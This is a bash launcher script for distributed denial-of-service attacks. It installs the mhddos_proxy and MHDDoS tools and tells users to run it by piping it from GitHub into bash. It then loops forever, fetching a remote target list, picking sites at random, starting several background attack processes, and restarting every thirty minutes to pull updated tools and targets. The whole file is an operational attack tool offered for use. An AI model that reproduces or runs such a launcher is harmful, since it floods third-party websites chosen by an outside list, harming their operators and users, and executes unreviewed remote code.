#!/bin/bash
##### Use next command in local linux terminal to run this script.
#  >>>>>   curl -s https://raw.githubusercontent.com/KarboDuck/karbo-wiki/master/runner.sh | bash   <<<<<
##### To kill script press CTRL+C several times.

## Restart script every N seconds (600s = 10m, 1800s = 30m, 3600s = 60m).
## It allows to download updates for mhddos_proxy, MHDDoS and target list.
restart_interval=1800

sudo apt update

# Install git if it doesn't installed already
if [ ! -f /usr/bin/git ]; then
   sudo apt install git -y
fi

# Install python3 if it doesn't installed already
if [ ! -f /usr/bin/python3 ]; then
   sudo apt install python3 -y
fi

# Install pip if it doesn't installed already
if [ ! -f /usr/bin/pip ]; then
   apt install python3-pip  -y
fi
pip install --upgrade pip > /dev/null #No output. Resolved some problems with pip on debian


#Install latest version of mhddos_proxy and MHDDoS
cd ~
rm -rf mhddos_proxy
git clone https://github.com/porthole-ascend-cinnamon/mhddos_proxy.git
cd mhddos_proxy
git clone https://github.com/MHProDev/MHDDoS.git
python3 -m pip install -r MHDDoS/requirements.txt

while true
echo "#####################################"
do
   # Get number of targets in runner_targets. First 5 strings ommited, those are reserved as comments.
   list_size=$(curl -s https://raw.githubusercontent.com/KarboDuck/karbo-wiki/master/runner_targets | cat | tail -n +6 | wc -l)
   
   echo -e "\nNumber of targets in list: " $list_size "\n"

   # Create list with random numbers. To choose random targets from lis on next step.
   random_numbers=$(shuf -i 1-$list_size -n $num_of_targets)
   echo -e "random numbers: " $random_numbers "\n"
   
   # Print all randomly selected targets on screen
   echo -e "Choosen targets:\n"
   for i in $random_numbers
   do
             site=$(awk 'NR=='"$i" <<< "$(curl -s https://raw.githubusercontent.com/KarboDuck/karbo-wiki/master/runner_targets | cat | tail -n +6)")
             echo -e "-- "$site"\n"
   done
      
   # Launch multiple runner instances with different targets and different attack types.
   for i in $random_numbers
   do
            # Get target (line) from targets list
            site=$(awk 'NR=='"$i" <<< "$(curl -s https://raw.githubusercontent.com/KarboDuck/karbo-wiki/master/runner_targets | cat | tail -n +6)")
            
            # Cut "command line" from string. Command line is everything before "#" that is used as delimiter for comments purpose.
            cmd_line=$(echo $site | awk -F "#" '{print $1}')
            
            #echo $cmd_line
            
            python3 ~/mhddos_proxy/runner.py $cmd_line&
   done
echo "#####################################"
sleep $restart_interval
echo -e "n RESTARTING\n"
pkill -f start.py
done
